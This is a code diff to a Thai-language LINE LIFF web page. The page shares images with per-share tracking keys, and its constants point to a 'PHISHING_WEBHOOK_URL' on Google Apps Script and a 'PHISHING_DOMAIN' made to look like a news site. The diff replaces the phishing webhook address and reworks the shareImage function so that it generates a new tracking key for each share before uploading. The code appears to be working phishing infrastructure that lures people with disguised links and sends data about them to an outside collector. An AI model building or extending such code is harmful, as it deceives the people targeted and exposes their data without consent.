@@ -399,7 +399,7 @@
         
         // URL สำหรับตรวจสอบสิทธิ์และส่งข้อมูล (แยกให้ชัดเจน)
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec'; // ไฟล์ LineOA.html
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbzu1bJQaMwegjw4LJL0xldY4t3L6fMT3i_31er0wspO29TvZUimlMfa9_o8Wai1h6l0Ag/exec'; // Updated GoogleScript.html Web App URL
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbzxpW6B5q7ll205P6MWoOCIzKh1ZR5s-tPhLqRB1ZsnMd9CNdBQNeWG3w5Ey1OxM-Eagg/exec'; // Updated GoogleScript.html Web App URL
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/index.html';
         
         // เริ่มต้นการทำงาน LIFF
@@ -704,38 +704,21 @@
         
         // ฟังก์ชันแชร์รูปภาพ
         async function shareImage() {
-            if (!isLiffInitialized) {
-                showStatus('กรุณารอให้ LIFF เริ่มต้นก่อน', false);
-                return;
-            }
-            
-            if (!userHasPermission) {
-                showStatus('คุณไม่มีสิทธิ์ใช้งานระบบนี้', false);
+            if (!isLiffInitialized || !userHasPermission) {
+                showStatus('กรุณารอให้ LIFF เริ่มต้นก่อน หรือคุณไม่มีสิทธิ์', false);
                 return;
             }
             
             const caseName = document.getElementById('caseName').value;
-            if (!caseName) {
-                showStatus('กรุณาระบุชื่อเคส', false);
+            if (!caseName || !selectedImage) {
+                showStatus('กรุณาระบุชื่อเคสและเลือกรูปภาพ', false);
                 return;
             }
             
-            if (!selectedImage) {
-                showStatus('กรุณาเลือกรูปภาพ', false);
-                return;
-            }
+            // IMPORTANT! Generate the key only once per share action
+            trackingKey = Date.now().toString(36) + Math.random().toString(36).substring(2, 6);
+            console.log("GENERATED NEW KEY: " + trackingKey);
             
-            // สร้าง Tracking Key ครั้งเดียวก่อนการใช้งาน (แก้ปัญหา key ซ้ำซ้อน)
-            if (!trackingKey) {
-                generateTrackingKey();
-            }
-            
-            // ตรวจสอบว่ามี trackingKey หรือไม่หลังจากการสร้าง
-            if (!trackingKey) {
-                 showStatus('ไม่สามารถสร้าง Tracking Key ได้', false);
-                 return; // หยุดการทำงานถ้าสร้าง Key ไม่สำเร็จ
-            }
-
             try {
                 // อัพโหลดรูปภาพ
                 imageUrl = await uploadImage();
